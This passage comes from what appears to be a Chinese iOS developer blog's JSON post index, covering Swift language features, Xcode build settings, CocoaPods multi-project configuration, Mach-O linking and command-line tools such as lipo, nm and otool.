here","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Collection","slug":"Collection","permalink":"http://yoursite.com/tags/Collection/"}]},{"title":"Xcode的Build参数Dump","date":"2017-08-01T15:00:00.000Z","path":"2017/08/02/Xcode的Build参数Dump/","text":"内置参数Xcode的编译过程其实就是执行一系列的shell脚本，而其本身是有很多内置参数的，比如说最常用的 $(SRCROOT) 就是代表了工程文件(其实是源代码的根目录)目录 SRC: source ROOT: root 在Java的配置里也有这个概念，如果想知道所有内置参数的信息，可以参考内置参数官方文档 Dump除了在文档里一个一个查，也可以直接dump出来，看看当前工程的内置参数都指向哪里 1xcodebuild -project &quot;Playground.xcodeproj&quot; -configuration &quot;Debug&quot; -target &quot;Playground&quot; -showBuildSettings 就可以查看到所有的内置参数 常用的内置参数 参数名 意义 $(SRCROOT) 源代码目录 $(PROJECT) Project的名字 $(TARGET_BUILD_DIR) 生成产物的DerivedData里的目录 $(PROJECT_FILE_PATH) xcproject所在文件夹","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"}]},{"title":"Swift的function变量引起CircleRetain","date":"2017-08-01T01:00:00.000Z","path":"2017/08/01/Swift的function变量引起CircleRetain/","text":"Swift的function根据文章Swift的闭包说明可以得知 Escape Block 会引起循环引用 12var value: （()-&gt;Void) &#x3D; &#123;&#125; 而Swift标榜的 Function First的函数变量，其实就是一个Escape Block 根据目前 官方文档的章节 Weak and Unowned References StackOverflow等网上讨论 并 没有解决在方法成员变量之间赋值引起循环引用的问题 ，假设存在两个Object 结论！！：目前2018.01.01 Swift4.0 不要瞎JB用方法成员变量，看上去很高端，还是老老实实的用delegate比较妥善 1234567891011121314151617181920212223242526class ObjectA: NSObject &#123; lazy var funcParameter: os_block_t? &#x3D; &#123; [unowned self]() -&gt; Void in print(&quot;original object A func&quot;) &#125; var valParameter: NSObject &#x3D; NSObject() deinit &#123; print(&quot;ObjectA deinit&quot;) &#125;&#125;class ObjectB: NSObject &#123; var a: ObjectA? func objectBFunction() &#123; print(&quot;original object B func&quot;) &#125; var valueBParameter: NSObject &#x3D; NSObject() deinit &#123; print(&quot;ObjectB deinit&quot;) &#125;&#125; 成员变量(valParameter)和方法成员变量(funcParameter)的区别首先实例化两个对象 A 和 B，并且将A赋值给B，让B持有一次A 12345var a: ObjectA? &#x3D; ObjectA.init() &#x2F;&#x2F;对象A被实例化var b: ObjectB? &#x3D; ObjectB.init() &#x2F;&#x2F;对象B被实例化b?.a &#x3D; a &#x2F;&#x2F;对象B--retain--&gt;A 成员变量(valParameter)赋值123456a?.valParameter &#x3D; (b?.valueBParameter)! &#x2F;&#x2F;将B的成员变量赋值给Aa &#x3D; nil &#x2F;&#x2F;释放Ab &#x3D; nil &#x2F;&#x2F;释放Bprint(&quot;End&quot;) &#x2F;&#x2F; End 根据输出可知，即使B的成员变量赋值给了A，也不会影响两者的释放 因为此时A和B共同持有 valueBParameter，A和B其自身的retain count没有增加 1234ObjectB deinitObjectA deinitEnd 方法成员变量(funcParameter)赋值如果 12345678a?.funcParameter?() &#x2F;&#x2F;调用A的自身的方法，输出 original object A funca?.funcParameter &#x3D; (b?.objectBFunction)! &#x2F;&#x2F;将B的方法成员变量赋值给A， A--retain--&gt;Ba?.funcParameter?() &#x2F;&#x2F;调用A的方法，输出 original object B func，因为已经被B替换a &#x3D; nil &#x2F;&#x2F;释放Ab &#x3D; nil &#x2F;&#x2F;释放Bprint(&quot;End&quot;) 根据输出可知，因为A和B产生了Retain Circle，并没有被正确释放, 因为方法成员变量 funcParameter 本身是一个Block Block的本质是该实例的一部分，其本身是一个方法地址，除了A和B外不会有第三个实例 1234original object A funcoriginal object B funcEnd","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"http://yoursite.com/tags/Swift/"}]},{"title":"Swift的throw和rethrow","date":"2017-08-01T01:00:00.000Z","path":"2017/08/01/Swift的throws和rethrows/","text":"Throws / Rethrows在观察FlatMap方法时，我们可以发现其函数声明 1public func flatMap(_ transform: (Element) throws -&gt; String?) rethrows -&gt; [String] 根据StackOverflow的解释,其实只用看最后一句 1Roughly speaking, rethrows is for functions which do not throw errors &quot;on their own&quot;, but only &quot;forward&quot; errors from their function parameters. 以下两种函数的声明 1234567&#x2F;&#x2F;该声明代表，入参lambda会丢出异常，函数本身throwCustomError也会丢出异常，内部会对lambda的异常进行处理func throwCustomError(function:(String) throws -&gt; ()) throws&#x2F;&#x2F;该声明代表仅有入参lambda会丢出异常，函数本身rethrowCustomError不会丢出异常，也不会捕获异常，仅仅转发丢出func rethrowCustomError(function:(String) throws -&gt; ()) rethrows 可以见比起Java的Throw更加细致，不知道是好还是坏，又加深了理解复杂度","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"http://yoursite.com/tags/Swift/"}]},{"title":"Swift的flatMap的用法","date":"2017-07-31T23:00:00.000Z","path":"2017/08/01/Swift的flatMap的用法/","text":"FlatMapFlatMap是函数式编程中的另外一个用法，主要是用于处理多组数据合并一组，和归约是不同的 方法 作用 Reduce 一组数据里所有的元素合并成一个元素 FlatMap 多组数据里的所有元素合并成一组数据 Swift中的FlatMapSwift中有两个FlatMap方法，可以接收两种不同的Lambda表达式 | lambda | 重点 | 文档 || :————- | :————- || transform: Element throws -&gt; ElementOfResult? | 返回值为Optional的ElementOfResult | ElementOfResult || transform: Element throws -&gt; Sequence | 返回值为Sequence，不为Optional |Sequence | 根据其描述不同 12ElementOfResult: Returns an array containing the non-nil results of calling the given transformation with each element of this sequence.Sequence: Returns an array containing the concatenated results of calling the given transformation with each element of this sequence. 讲人话就是 ElementOfResult不改变内部元素，仅仅删除掉nil的选项 Sequence把所有元素内部的元素也进行Flat(压平，合并到一起，concatenated)，并且不允许存在nil，必须把nil替换为默认值 12345678910111213let couple &#x3D; [[1,2,3],[4,5,6], nil, [8,9]]var nonnil &#x3D; couple.flatMap(&#123; (number) -&gt; [Int]? in return number &#x2F;&#x2F;返回元素[Int]，为Int数组，并且把nil过滤掉&#125;)var flatten &#x3D; couple.flatMap(&#123; (number) -&gt; [Int] in return number ?? [7] &#x2F;&#x2F;把所有元素[Int],Int数组合并成一个数组，并且把nil用[7]，仅有一个元素7的Int数组替换&#125;)print(nonnil) &#x2F;&#x2F;[[1, 2, 3], [4, 5, 6], [8, 9]]print(flatten) &#x2F;&#x2F;[1, 2, 3, 4, 5, 6, 7, 8, 9] 更复杂的情况如果在子元素的数组里也存在nil，则可以把两个flatMap方法结合起来用 123456789101112let complex &#x3D; [[1,2,3],[4,5,6], nil, [8,9,nil]]let simple &#x3D; complex.flatMap &#123; (number) -&gt; [Int] in &#x2F;&#x2F;首先去除子数组的 [8,9,nil]里的nil let non_sub_nil &#x3D; number?.flatMap(&#123; (sub) -&gt; Int? in return sub &#125;) &#x2F;&#x2F;其次concatenated压平它们 return non_sub_nil ?? [7]&#125;print(simple) &#x2F;&#x2F;[1, 2, 3, 4, 5, 6, 7, 8, 9]","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"http://yoursite.com/tags/Swift/"}]},{"title":"Swift的map/reduce/filter的用法","date":"2017-07-31T22:00:00.000Z","path":"2017/08/01/Swift的mapreducefilter的用法/","text":"函数式编程的常用方法2016-2017年在吹AI之前，一堆人对着函数式编程一阵狂吹，导致各家语言都加入了函数式编程的基本支持，其中三个基本方法就是map/reduce/filter 名词 概念 原理 lambda 函数式编程的基本方法 其实就是一个回调方法的语法糖，代表着一个匿名方法 map 数学中的映射概念 将一组数据集通过一个逻辑转换成另一个数据集，逻辑就是传入的lambda表达式，就是一个方法 reduce 数学中的归约概念 将一组数据集通过一个逻辑转化成一个结果 filter 过滤 将一个数据集中符合条件的筛选出来，很容易理解 Filter &amp; Map假设存在一个数组1-9，我们可以通过两个Lambda表达式进行筛选和映射，其实就是两个Block，入参是 number 返回值分别是Bool类型和Int类型 12345678910111213let original &#x3D; [1,2,3,4,5,6,7,8,9]var result : Array&lt;Int&gt;? &#x3D; nilresult &#x3D; original.filter(&#123; (number) -&gt; Bool in return number%2 &#x3D;&#x3D; 0&#125;)print(result!) &#x2F;&#x2F;[2, 4, 6, 8]result &#x3D; original.map(&#123; (number) -&gt; Int in return number + 1&#125;)print(result!) &#x2F;&#x2F;[2, 3, 4, 5, 6, 7, 8, 9, 10] Reduce归约的思路稍微复杂一点，就是把数组1-9变为一个数，即数组中所有的元素都参与运算，reduce接收两个参数 函数运算的初试值 函数运算的逻辑(即lambda表达式) 12345var sum: Int &#x3D; original.reduce(100, &#123; (temp, number) -&gt; Int in return temp + number&#125;)print(sum) &#x2F;&#x2F; 145 其中lambda表达式有两个参数 上次运算的结果temp，由于第一次运算不存在上次运算结果，所以使用初始值 这次进入的元素number 所以sum就是 100+1+2+3+4+5+6+7+8+9","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"http://yoursite.com/tags/Swift/"}]},{"title":"Swift的defer用法","date":"2017-07-31T21:00:00.000Z","path":"2017/08/01/Swift的defer用法/","text":"synchronized在Swift中互斥对象锁synchronized在OC中的用法是 123@synchronized(self) &#123;&#125; 但是在swift中变成了 1234567objc_sync_enter(self)if (condition) &#123;&#125;objc_sync_exit(self) 如果函数在 if 循环内进行了return可能会导致 objc_sync_exit无法执行 导致死锁，为了解决这种情况，可以使用 defer 1234567objc_sync_enter(self)defer &#123; objc_sync_exit(self) &#125;if (condition) &#123;&#125; deferdefer在函数结束后按照入栈顺序逆向执行，无论以何种形式结束都不会跳过执行，官方文档参考Defer Statement与之对应的概念在C++中有个叫RAII的设计模式 1234567891011121314151617func testDefer() &#123; print(&quot;First....&quot;) print(&quot;Second...&quot;) defer &#123; print(&quot;Last...&quot;) &#x2F;&#x2F;先入栈，后出栈，倒数第一个执行 print(&quot;End defer....&quot;) &#125; defer &#123; print(&quot;Last Second...&quot;) &#x2F;&#x2F;后入栈，先出栈，倒数第二个执行 &#125; print(&quot;If Logic....&quot;) &#x2F;&#x2F;早于任何defer逻辑进行执行&#125; 打印结果 1234567First....Second...If Logic....Last Second...Last...End defer....","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"http://yoursite.com/tags/Swift/"}]},{"title":"Swift的where用法","date":"2017-07-31T20:00:00.000Z","path":"2017/08/01/Swift的where用法/","text":"where关键词Swift用where关键词来指定一些特殊情况 指定Generic Type 和 where的AND用法代表入参数必须同时是UIView和NSObject 12345func genericFunc&lt;T&gt;(param:T) where T:UIView, T:NSObject&#123; print(&quot;Input parameter is enter&quot;)&#125;genericFunc(param: UIView()) &#x2F;&#x2F;可以执行 如果使用另外一个入参，将会提示错误 1234genericFunc(param: NSObject())&#x2F;&#x2F; error: cannot convert value of type &#39;NSObject&#39; to expected argument type &#39;UIView&#39; genericFunc(param: NSObject()) as! UIView 指定Protocol的Extension类型针对同一个Protocol和不同的Class进行公用时，来完成不同的实现 123456789101112131415161718192021222324protocol SomeProtocol &#123; func protocolFunc()&#125;extension SomeProtocol where Self: UIView &#123; func protocolFunc() &#123; print(&quot;This Extension for UIView&quot;) &#125;&#125;extension SomeProtocol where Self: CALayer &#123; func protocolFunc() &#123; print(&quot;This Extension for CALayer&quot;) &#125;&#125;class ViewTest: UIView, SomeProtocol &#123;&#125;class LayerTest: CALayer, SomeProtocol &#123;&#125;let tempView: ViewTest &#x3D; ViewTest()let tempLayer: LayerTest &#x3D; LayerTest()tempView.protocolFunc() &#x2F;&#x2F;&quot;This Extension for UIView&quot;tempLayer.protocolFunc() &#x2F;&#x2F;&quot;This Extension for CALayer&quot; 与其他控制流函数结合也可以用于过滤控制流里的某些条件 123456789101112131415161718&#x2F;&#x2F;do....catch...do&#123; try throwError()&#125;catch ExceptionError.httpCode(let httpCode) where httpCode &gt;&#x3D; 500&#123; print(&quot;server error&quot;)&#125;&#x2F;&#x2F;switchswitch value &#123;case let x where x &lt; 60:default:&#125;&#x2F;&#x2F;forfor i in numbers where i &gt; 3 &#123;&#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"http://yoursite.com/tags/Swift/"}]},{"title":"Swift的readonly声明","date":"2017-07-31T15:00:00.000Z","path":"2017/08/01/Swift的readonly声明/","text":"在Class中根据StackOverflow回答 1private(set) public var readonlyProperty: Int 在Protocol里123var readonlyProperty: Int &#123; get &#125;var readwriteProperty: Int &#123; get set &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"http://yoursite.com/tags/Swift/"}]},{"title":"循环引用与闭包逃逸","date":"2017-07-31T15:00:00.000Z","path":"2017/08/01/循环引用与闭包逃逸/","text":"循环引用与闭包逃逸在一年前的一个文章里循环引用提到了在某下情况下可以在闭包中安全使用 self 而不引起循环引用的问题 当时的分析是错误的，确实没有引起循环引用，但是对于原因的定位是错误的 但是万幸当时知道了Block存在三种 StackBlock MallocBlock GlobalBlock 最近详细研究了一下。 Block类型 解释 StackBlock 函数盏内的Block，除了该Block存在的类对其进行了Retain之外，别的对象不会Retain它 MallocBlock 内存中的Block，本身可以被其它对象持有，RetainCount不定 GlobalBlock 全局Block，并不被特定的对象持有，相当于全局变量 Block的实质以下面的Block为例子,根据Mach-O文件分析，其实质相当于一个对象的方法 123456- (void)someMethod &#123; [self someFuncWithBlock:^&#123; &#x2F;&#x2F;Block &#125;];&#125; 将会在符号表中生成一个类似这个名字的函数 12300000436 t -[Class someMethod]......00000634 t ___45-[Class someMethod]_block_invoke 当我们使用A对象，调用当B对象当B中的 someFuncWithBlock 并且传入一个Block时，OC会在Runtime的过程中创建一个Block Object 闭包逃逸Escaping那么这个Block到底是 StackBlock 还是 MallocBlock 决定于 someFuncWithBlock 内部的实现，而内部实现决定了 12345678910&#x2F;&#x2F;StackBlock- (void)someFuncWithBlock:(void (^)())block &#123; block();&#125;&#x2F;&#x2F;MallocBlock- (void)someFuncWithBlock:(void (^)())block &#123; self.inner &#x3D; block;&#125; 在 StackBlock 的实现中，Block的接收对象并没有对其进行任何Retain，直接进行执行 而 MallocBlock 则是对传入对象进行了 持有，对其Retain Count +1 此时Block的对象由Stack逃出(Escaping)到Malloc上，内存模型如下 StackBlock MallocBlock 当Autorelease时当前线程的Runloop执行完一次，调用AutoreleasePool对象执行了drain方法后，StackBlock由于引用计数为零，将会被释放，而MallocBlock由于引用计数不为零，则不会被释放 StackBlock: Block释放–&gt;A Retain -1 –&gt;A释放–&gt;B释放 MallocBlock: Block无法释放–&gt;A不会释放–&gt;B不会释放–&gt;Block无法释放 此时发现，如果在MallocBlock中调用了self，则会导致循环引用 Cycle Retain 结论循环引用Retain Cycle是存在的，但是在StackBlock下可以安全的使用self，Swift中加强了这个概念，引入了@escaping来提醒码农不可以安全使用self Swift中所有的Block默认都是 @unescaping 的，在Swift 3.0之后生效","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Block","slug":"Block","permalink":"http://yoursite.com/tags/Block/"}]},{"title":"模块化(31)：Link对Mach-O图解总结","date":"2017-07-30T15:00:00.000Z","path":"2017/07/31/模块化31Link对Mach-O图解总结/","text":"Static Lib —&gt; App Framework(Dynamic) —&gt; App Framework(Dynamic) —&gt; Framework(Dynamic) Framework(Static) —&gt; Framework(Dynamic)/App Framework(Static) —&gt; Framework(Dynamic) —&gt; App","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"}]},{"title":"模块化与Unity(28)：DynamicHeapAllocator和MKMapKit渲染的冲突","date":"2017-07-27T15:00:00.000Z","path":"2017/07/28/模块化28Unity与DynamicHeapAllocator和MKMapKit渲染的冲突/","text":"意外收获在制作模块化的过程中，发现了一个Unity模块和苹果MapKit的内存管理冲突的BUG，可以通过framework化来解决 表现每当地图进行缩放操作，整个App就进入半卡死状态，通过Profile分析，CPU占用爆满超过半分钟，大量调用以下函数 1DynamicHeapAllocator...... 原因 Unity导出的iOS项目存在一个线程锁DynamicHeapAllocator 对某个OC的原生函数加了切面 地图在进行Context渲染时会同时并发大量线程 地图的渲染线程会被互相锁住，导致CPU爆炸 分析如果Unity以Static Mach-O的形式加载进入项目，主体App的地图的某些函数做出切面拦截，主要是因为Unity的 C++ 代码符号和主体App在同一个Mach-O里 解决方案Unity的显示部分以 Dynamic Framework的形式挂载到App上，做到和主工程的Mach-O分离 参考文章Mach-O的加载，可以防止MapKit的函数被 DynamicHeapAllocator 切面拦截到","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"Unity","slug":"Unity","permalink":"http://yoursite.com/tags/Unity/"}]},{"title":"模块化与CocoaPods(27)：使用FrameworkPod协调多工程","date":"2017-07-26T15:00:00.000Z","path":"2017/07/27/模块化27CocoaPods与使用FrameworkPod协调多工程/","text":"提醒因为Pods对Project的更改具有入侵性，为了防止这个入侵，可以 准备一个 Pods-Bridge.xcodeproj 用来引入Cocoapods 这个解决方案感觉有点取巧。。。希望模块化有经验的人士可以在Github的issue给予指导 目的 可以使用Pods管理的第三方库为了方便引用 不能需要对每个Project都配置一个Podfile 每个Project在脱离了Podsfile的管理时也可以单独编译通过 而不会因为Podfile产生的脚本Not Found在Build时报错 对现有项目进行Frameworks改造需要使用到Pods的模块，仅需通过Framework的形式引入Cocoapods生成的第三方库即可，步骤如下 新建 Pods-Bridge.xcodeproj 为 Pods-Bridge.xcodeproj 准备Podfile 为 Pods-Bridge.xcodeproj 进行 pod install 新建自己的 workspace AppGroup.xcworkspace 将自己的 SharedLib.xcodeproj 和 pod install生成Pods.xcodeproj 拖入AppGroup.xcworkspace 配置SharedLib.xcodeproj 的 Framework Search Path为 Podfile中的 EXPORT_DEST_DIR 完成以上操作后，在整个AppGroup.xcworkspace 中的任何Project都可以以Framework的形式引入 Cocoapods管理的第三方库 使用Bridge后 Xcode头文件联想问题可以在 Build Settings———— Framework Search Path 输入编译目录，则会再Framework编译后正常联想 1$(TARGET_BUILD_DIR) Podfile1234567891011121314151617181920212223242526272829303132333435363738# 这里标记使用Frameworkuse_frameworks!#设定Workspaceworkspace &#39;Playground&#39;# 该工程仅用于生成Pod.xcodeprojtarget &#39;Pods-Bridge&#39; do project &quot;Pods-Bridge&#x2F;Pods-Bridge.xcodeproj&quot; #Net pod &#39;Masonry&#39;, &#39;1.0.2&#39;end# 加入脚本 将Pods生成的Frameworks# 1. 拷贝到指定目录 EXPORT_DEST_DIR# 2. 拷贝到 CODESIGNING_FOLDER_PATH的根目录 保证模拟器可以正常运行EXPORT_PHASE_NAME &#x3D; &quot;Frameworks Export&quot;EXPORT_DEST_DIR &#x3D; &quot;$SRCROOT&#x2F;..&#x2F;..&#x2F;Frameworks&#x2F;&quot;EXPORT_ASSIGN_DEST &#x3D; &quot;cp -r $CODESIGNING_FOLDER_PATH #&#123;EXPORT_DEST_DIR&#125;&quot;EXPORT_BUILD_ROOT &#x3D; &quot;cp -r $CODESIGNING_FOLDER_PATH $CODESIGNING_FOLDER_PATH&#x2F;..&#x2F;..&quot;post_install do |installer| installer.pods_project.targets.each do |target| # add build phase phase &#x3D; target.shell_script_build_phases.select&#123; |bp| bp.name &#x3D;&#x3D; EXPORT_PHASE_NAME &#125;.first || target.new_shell_script_build_phase(EXPORT_PHASE_NAME) phase.shell_path &#x3D; &quot;&#x2F;bin&#x2F;sh&quot; phase.shell_script &#x3D; &quot;#&#123;EXPORT_BUILD_ROOT&#125;\\n#&#123;EXPORT_ASSIGN_DEST&#125;&quot; phase.show_env_vars_in_log &#x3D; &#39;0&#39; endend 备注如果仅有一个App的情况，Pods-Bridge.xcodeproj可以是App的工程 App.xcodeproj,那么上文的 AppGroup.xcworkspace 和由 Podfile生成的 Pods-Bridge.xcworkspace就是一个Workspace","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"CocoaPods","slug":"CocoaPods","permalink":"http://yoursite.com/tags/CocoaPods/"}]},{"title":"模块化与CocoaPods(26)：管理多Project","date":"2017-07-25T15:00:00.000Z","path":"2017/07/26/模块化26CocoaPods与管理多Project/","text":"一份Podfile同时处理多个本地Project根据CocoaPods官网给出的编写指南，我们可以使用一个Podfile文件来管理不同的Project 123456789101112131415platform :ios, &#39;8.0&#39;workspace &#39;Playground&#39;target &#39;SharedLib&#39; do project &#39;..&#x2F;SharedLib&#x2F;SharedLib&#39; pod &#39;Masonry&#39;endtarget &#39;Playground&#39; do project &#39;Playground&#39; pod &#39;AFNetworking&#39;, &#39;~&gt; 3.0&#39; pod &#39;Masonry&#39;end 在这种情况下 SharedLib.xcodeproj 所在的目录不会存在任何和Pods相关的文件，但是Prject本身被Pod执行了 4-6 步骤 ，此时打开 Playground.xcworkspace 可以得到正确的引用关系，但是会带来一些其它的问题 Project单独无法编译通过由于 Podfile 执行完毕，其对 SharedLib.xcodeproj 产生了更改，会导致其单独打开编译无法通过，报错信息 1ld: library not found for -lPods-SharedLib.a 可以看到原因是由于 -lPods-SharedLib.a 被Pods加入 Link Libraries 但是其存在于 Playground.xcworkspace 下 Pod.xcodeproj 的 Product目录中，单独打开 SharedLib.xcodeproj 在可视范围内找不到该库，导致无法进行正确的Link Pods之间不共存假设存在另外一个工程 Playsecond.xcodeproj 也想通过同样的方法引用 SharedLib.xcodeproj , 即使让SharedLib.xcodeproj 存在两个Target用于不同的引用 Target Podfile PODS_ROOT 被Pods添加的虚拟库 SharedLibA.a Playground/Podfile SharedLib/../Playground/Pods lPods-SharedLibA.a SharedLibB.a Playsecond/Podfile SharedLib/../Playsecond/Pods lPods-SharedLibB.a 即使在这种情况下，也会出现Pods不共存的情况，现象为 在 Playground 下执行 pod update ， Playground.xcworkspace 里编译通过 在 Playsecond 下执行 pod update ， Playsecond.xcworkspace 里编译通过 回到 Playground 下，Playground.xcworkspace 编译不通过， 提示如下错误 进行步骤1 之后，会发现 Playsecond.xcworkspace 编译不通过，提示相同错误 1The sandbox is not in sync with the Podfile.lock. Run &#39;pod install&#39; or update your CocoaPods installation. 提示pod和 Podfile.lock 原因猜测 是因为每次Pod完成后会做一次Hash，如果当前工程的Hash值和Podfile.lock对不上，就会要求Update Pods的文件结构 由于 Playground.xcworkspace 和 Playsecond.xcodeproj 都会对 SharedLib.xcodeproj 进行更改，导致Hash值产生变化，所以会导致需要重新Update","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"CocoaPods","slug":"CocoaPods","permalink":"http://yoursite.com/tags/CocoaPods/"}]},{"title":"模块化与CocoaPods(25)：StaticLib和Framework两种方式引入Pods","date":"2017-07-24T15:00:00.000Z","path":"2017/07/25/模块化25CocoaPods与StaticLib和Framework两种方式引入Pods/","text":"CocoaPods的原理CocoaPods的原理就是通过脚本完成以下工作，假设存在 Playground.xcodeproj 的 Project 对所有库的头文件创建软连接，并且放入Pods目录 创建 Pods.xcodeproj 把所有的静态库打包在一起，形成一个虚拟的 lib-pods.a 的 Target 然后创建一个WorkSpace加入 Playground.xcodeproj 和 Pods.xcodeproj 配置 Playground.xcodeproj 的 Header Search Paths 引入所有Pod目录下库的头文件软连接 配置 Playground.xcodeproj 的 Linked Binary With Libraries 加入lib-pods.a 配置 Playground.xcodeproj 的 Build Phase 添加一系列脚本,类似 XX Pods XXX 使用Framework引入Pods正常的情况下，Pods都是通过Static Lib来加载，根据CocoaPods官网可以使用指令 use_frameworks! 让Cocoapods以Framewrok的形式加入工程 1234use_frameworks!platform :ios, &#39;8.0&#39;........ CocoaPods 1.2.1版本的BUGCocoPods的1.2.1版本无法将Static Lib的工程作为target，使用Pods，会报错如下,GitHub上说已修正 1234567[!] Unable to find host target(s) for SharedLib. Please add the host targets for the embedded targets to the Podfile.Certain kinds of targets require a host target. A host target is a &quot;parent&quot; target which embeds a &quot;child&quot; target. These are example types of targets that need a host target:- Framework- App Extension- Watch OS 1 Extension- Messages Extension (except when used with a Messages Application)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Xcode","slug":"Xcode","permalink":"http://yoursite.com/tags/Xcode/"},{"name":"Compiler","slug":"Compiler","permalink":"http://yoursite.com/tags/Compiler/"},{"name":"CocoaPods","slug":"CocoaPods","permalink":"http://yoursite.com/tags/CocoaPods/"}]},{"title":"模块化与Shell(24)：常用的工具","date":"2017-07-23T15:00:00.000Z","path":"2017/07/24/模块化24Shell与常用的工具/","text":"Xcode相关命令行lipo最常见的命令行，用于合并和拆封 Framework，在Framework脚本伪装Bundle 文章中用来摘除多余架构 1234&#x2F;&#x2F;抽出架构lipo -extract &quot;$ARCH&quot; &quot;$FRAMEWORK_EXECUTABLE_PATH&quot; -o &quot;$FRAMEWORK_EXECUTABLE_PATH-$ARCH&quot;&#x2F;&#x2F;合并多个架构Framework 为一个lipo -o &quot;$FRAMEWORK_EXECUTABLE&quot; -create &quot;$FRAMEWORK_EXECUTABLE-ARM64&quot; &quot;$FRAMEWORK_EXECUTABLE-X86&quot; nm最常用的查看符号表的指令，在文章 Xcode和符号表 中用于查看不同Mach-O的的符号表差异 1nm &quot;$MACH-O-FILE&quot; 其中除了压缩包和符号表的不同，指的注意的是该符号是否具有地址和类型 1234560000000000000000 t -[StaticLibObj init]00000000000000a0 t -[StaticLibObj selectorInStaticLibraryObjFix] U _NSLog U _OBJC_CLASS_$_NSObject00000000000000d8 S _OBJC_CLASS_$_StaticLibObj 类型 是否具有地址 备注 t 有 U 无 代表未定义的符号 S 有 s 有 otool用于查看 Mach-O文件的构造，在Framework脚本伪装Bundle 文章中用来判断是否是Static Mach-O，其指令 1otool -a &quot;$FRAMEWORK_EXECUTABLE_PATH&quot; | head -n 1 可以利用其输出的不同，来进行准确的判断 Mach-O 输出 Static Archive : ….Base.framework/Base Dynamic 无输出 -a 参数的描述 1-a Display the archive header, if the file is an archive. defaults用于读写Plist，其实Bundle和Framework的plist文件差别不大，在Framework脚本伪装Bundle 文章中用来修改有区别的字段 123456&#x2F;&#x2F;读取所有字段defaults read &quot;$FRAMEWORK&#x2F;Info.plist&quot;&#x2F;&#x2F;修改 CFBundlePackageType 为 &quot;BNDL&quot;defaults write &quot;$FRAMEWORK&#x2F;Info.plist&quot; CFBundlePackageType &quot;BNDL&quot;&#x2F;&#x2F;删除 CFBundleExecutable 字段defaults delete &quot;$FRAMEWORK&#x2F;Info.plist&quot; CFBundleExecutable assetutil用于查看资源文件 Assets.car 包含的文件，在 UniqueFramework的制作 可以配合 nm 命令检查 资源 和 符号表 的最终结果 12&#x2F;&#x2F;以Json的格式打印出所有资源assetutil -I &quot;....&#x2F;..&#x2F;Assets.car&quot; actool在Xcode Build的过程中，用来把 .xcasseets 文件夹压缩成 Asset.car 文件的工具, 在UniqueFramework的制作过程中，也可以尝试自己脚本来处理资源 以下是把 Media1 和 Media2 一起压缩成 某个Framework里的 Assets.car的命令 1234567891011121314&#x2F;Applications&#x2F;Xcode.app&#x2F;Contents&#x2F;Developer&#x2F;usr&#x2F;bin&#x2F;actool--output-format human-readable-text--notices --warnings--export-dependency-info &quot;....assetcatalog_dependencies&quot;--output-partial-info-plist &quot;....&#x2F;assetcatalog_generated_info.plist&quot;--compress-pngs--enable-on-demand-resources NO--filter-for-device-model iPhone7,2--filter-for-device-os-version 11.0--sticker-pack-identifier-prefix &quot;com.XXX.sticker-pack&quot;--target-device iphone --target-device ipad--minimum-deployment-target 9.0 --platform iphoneos--product-type com.apple.product-type.framework--compile &quot;&#x2F;Debug-iphoneos&#x2F;Some.framework&quot; &quot;...&#x2F;Resource&#x2F;Media1.xcassets&quot; &quot;...&#x2F;Resource&#x2F;Media2.xcassets&quot; Linux通用命令行head用来取出命令行输出的头部，在Framework脚本伪装Bundle 文中配合 otool来验证判断，不然输出太多 1head -n 1 od按二进制取出读取文件的, 原本想用二进制文件的头部判断 Static Framework 因为误以为 Static Framework的头部是一样，后来发现会受到架构的影响 12345od -H -A n -N 8 static.framework&#x2F;static#-H, -X Output hexadecimal ints. Equivalent#-A base Specify the input address base. base may be one of d, o, x or n, which specify decimal, octal, hexadecimal addresses#-N length Dump at most length bytes of input 其中 H代表输出十六进制， A n 代表以十六进制显示地址， 